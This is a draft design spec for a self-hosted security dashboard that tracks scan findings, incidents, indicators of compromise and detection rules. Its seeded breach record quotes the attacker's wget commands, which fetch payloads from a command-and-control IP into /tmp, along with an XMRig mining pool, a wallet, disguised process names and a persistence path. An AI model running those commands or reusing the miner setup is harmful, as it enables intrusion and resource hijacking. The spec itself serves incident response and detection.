# MyOrbis Security Orchestrator — Spec (draft)

Working name: **Orbis Sentinel**. Standalone security tool for the MyOrbisResults
family (same self-hosted, dependency-light pattern as the content-engine). Runs the
8-dimension scanner fleet, stores findings + incidents + threat intel in a DB, and
serves an admin dashboard. Gated to `platform_super_admin`.

Stack: Node/TS (ESM), Prisma + SQLite (upgrade to Postgres if it outgrows one box),
dependency-free HTTP operator UI. Scanners run as jobs (on-demand + scheduled +
on-deploy webhook). Read-only against prod; ephemeral scanner containers.

---

## Data model (Prisma)

```prisma
// ---- Assets & scanning ----
model Asset {
  id             String  @id @default(cuid())
  name           String                       // "myorbis-storefront-api", "OrbisVoice2026", "products.myorbisresults.com"
  kind           String                       // repo | container | host | endpoint | image
  location       String                       // path, container name, or URL
  box            String?                       // box1 | box2 | edge | cloud
  internetFacing Boolean @default(false)
  denylisted     Boolean @default(false)      // bps_zf/zerofees/etc — never scanned
  findings       Finding[]
  compliance     BaselineCompliance[]
  createdAt      DateTime @default(now())
}

model Scan {
  id           String   @id @default(cuid())
  dimension    String                          // sca|container|secrets|sast|edge-net|identity|live-web|supply-chain|all
  status       String   @default("running")   // running|done|failed
  startedAt    DateTime @default(now())
  finishedAt   DateTime?
  trigger      String                          // manual|scheduled|on-deploy
  coverageNote String?  @db.Text               // what ran / what couldn't (honesty gate)
  findings     Finding[]
}

model Finding {
  id          String   @id @default(cuid())
  scanId      String
  scan        Scan     @relation(fields: [scanId], references: [id])
  assetId     String
  asset       Asset    @relation(fields: [assetId], references: [id])
  fingerprint String                           // dedupe key: hash(app+class+location+title)
  vulnClass   String                           // dependency-cve|container|secret|injection|ssrf|authz|headers|supply-chain...
  severity    String                           // critical|high|medium|low|info
  exposure    String                           // internet|internal|local
  title       String
  location    String                           // file:line | container | host | URL
  evidence    String   @db.Text
  cve         String?
  remediation String   @db.Text
  status      String   @default("open")        // open|remediated|accepted|false_positive
  riskScore   Int                              // severity × exploitability × exposure, computed
  firstSeen   DateTime @default(now())
  lastSeen    DateTime @default(now())
  @@unique([fingerprint])
}

// ---- Hardening baseline ----
model BaselineControl {
  id          String @id @default(cuid())
  key         String @unique                   // non-root, patched-deps, env-file, egress-allowlist, rotated-secrets, sec-headers, internal-db
  title       String
  description String @db.Text
  severity    String                            // weight if failing
  compliance  BaselineCompliance[]
}

model BaselineCompliance {
  assetId   String
  asset     Asset            @relation(fields: [assetId], references: [id])
  controlId String
  control   BaselineControl  @relation(fields: [controlId], references: [id])
  status    String                              // pass|fail|na
  evidence  String?          @db.Text
  checkedAt DateTime @default(now())
  @@id([assetId, controlId])
}

// ---- Incident & Threat Intel (the "learn from every attack" module) ----
model Incident {
  id          String   @id @default(cuid())
  title       String                            // "Storefront cryptojacking 2026-07-28"
  occurredAt  DateTime
  severity    String
  status      String   @default("closed")       // active|contained|closed
  vector      String   @db.Text                  // how they got in
  summary     String   @db.Text
  timelineJson Json                              // [{ts, event}]
  codeUsed    String?  @db.Text                  // exact commands/payloads observed (wget C2, XMRig config, etc.)
  remediation String   @db.Text
  mitreJson   Json?                              // [{tactic, technique, id}]  e.g. T1190 Exploit Public-Facing App, T1496 Resource Hijacking
  iocs        Ioc[]
  rules       DetectionRule[]
  createdAt   DateTime @default(now())
}

model Ioc {
  id         String   @id @default(cuid())
  incidentId String?
  incident   Incident? @relation(fields: [incidentId], references: [id])
  type       String                             // ip|domain|url|hash|filepath|process|wallet|pool|ua|regex
  value      String
  context    String?                            // "C2/payload host", "mining pool", "disguised miner"
  active     Boolean @default(true)             // still worth matching?
  addedAt    DateTime @default(now())
  @@index([type, value])
}

model DetectionRule {
  id          String  @id @default(cuid())
  incidentId  String?
  incident    Incident? @relation(fields: [incidentId], references: [id])
  name        String
  description String  @db.Text
  matchType   String                             // egress_ip|process_path|container_root|dep_version|file_hash|open_port|regex
  matchSpec   Json                               // {ips:[...]} | {path:"/var/tmp"} | {pkg:"next",lt:"15.2.3"} ...
  severity    String
  enabled     Boolean @default(true)
  lastFiredAt DateTime?
  alerts      Alert[]
}

model Alert {
  id       String   @id @default(cuid())
  ruleId   String
  rule     DetectionRule @relation(fields: [ruleId], references: [id])
  assetId  String?
  firedAt  DateTime @default(now())
  detail   String   @db.Text
  status   String   @default("open")             // open|ack|resolved|false_positive
}
```

The loop that makes it compound: **Incident → IOCs + DetectionRules → every future Scan
runs the rules → Alerts.** The storefront breach seeds the first Incident, and its rules
(egress to `77.90.13.20`/`45.86.86.254`, any process from `/var/tmp` or `/root/.sysinit`,
internet-facing container running as root, `next < 15.2.3`) run on every scan thereafter.

---

## Dashboard tabs

```
┌ Orbis Sentinel ────────────────────────────────────────────────┐
│ Overview │ Findings │ Scan │ Baseline │ Incidents │ Threat Intel │ Alerts │ History │
└─────────────────────────────────────────────────────────────────┘
```

1. **Overview** — family security score (0–100), severity donut, open-criticals count,
   trend line (score over time), last-scan timestamp, top-5 risks.
2. **Findings** — sortable/filterable table (app · severity · class · exposure · status).
   Row → detail drawer: evidence, location, CVE link, remediation, status control
   (open/remediated/accepted/false-positive). Bulk actions.
3. **Scan** — trigger any dimension or app on demand; schedule (cron); on-deploy hook;
   live progress of running scans; per-run coverage notes.
4. **Baseline** — asset × control heatmap (pass/fail/na). Click a red cell → why it
   failed + the fix. Per-app compliance %.
5. **Incidents** — list of attacks. Detail page: vector, timeline, **code/commands used**,
   MITRE ATT&CK chips, linked IOCs, remediation, status. "New incident" form.
6. **Threat Intel** — IOC library (searchable by type/value, active toggle) + Detection
   Rules (enabled/disabled, last fired, match spec). This is the reusable knowledge base.
7. **Alerts** — detection-rule hits: what fired, which asset, when, evidence. Ack/resolve.
8. **History** — every scan run + what changed (new/fixed/regressed findings) over time.

---

## Seed data — Incident #1 (this breach)

- **Title:** Storefront cryptojacking, 2026-07-28
- **Vector:** Next.js 15.1.6 in-memory RCE (CVE-2025-29927 middleware-bypass / RSC-RCE
  class) against `products.myorbisresults.com`, container running as **root**.
- **Code used:** `wget http://77.90.13.20/dashboard -O /tmp/dashboard`,
  `wget http://77.90.13.20/v.json -O /tmp/v.json`; XMRig RandomX (`rx/0`) config pointing
  at pool `45.86.86.254:443` user `checknit1111`; miners disguised as `cpu-logind` /
  `auditsd` / `vfsd`, persistence `/root/.sysinit`.
- **MITRE:** T1190 (Exploit Public-Facing App), T1496 (Resource Hijacking), T1036
  (Masquerading), T1552.001 (Creds in files — env leaked via error logs).
- **IOCs:** ip `77.90.13.20` (C2), pool `45.86.86.254`, wallet `checknit1111`, filepaths
  `/var/tmp/cpu-logind` `/app/.global/auditsd` `/root/.sysinit`, processes
  `cpu-logind`/`auditsd`/`vfsd`.
- **Detection rules generated:** egress_ip {77.90.13.20, 45.86.86.254}; process_path
  {/var/tmp, /root/.sysinit}; container_root + internetFacing; dep_version {next < 15.2.3}.
- **Remediation:** patched Next 15.5.22, non-root container, egress block, hub-token +
  DASH-secret rotation, OpenAI key consolidation. (Full record in memory
  `storefront-breach-2026-07-28`.)

---

## Build order (after the one-shot sweep lands)

1. Scaffold repo + Prisma schema above + SQLite.
2. Import the sweep's register JSON → Findings + Assets. Seed BaselineControls.
3. Seed Incident #1 + its IOCs + DetectionRules.
4. Wrap the 8 scanners as job runners (reuse the Workflow agents' commands).
5. Operator UI tabs (Overview → Findings → Scan → Baseline → Incidents → Threat Intel →
   Alerts → History).
6. Scheduler + on-deploy webhook. Auth gate. Docker + box deploy.
```
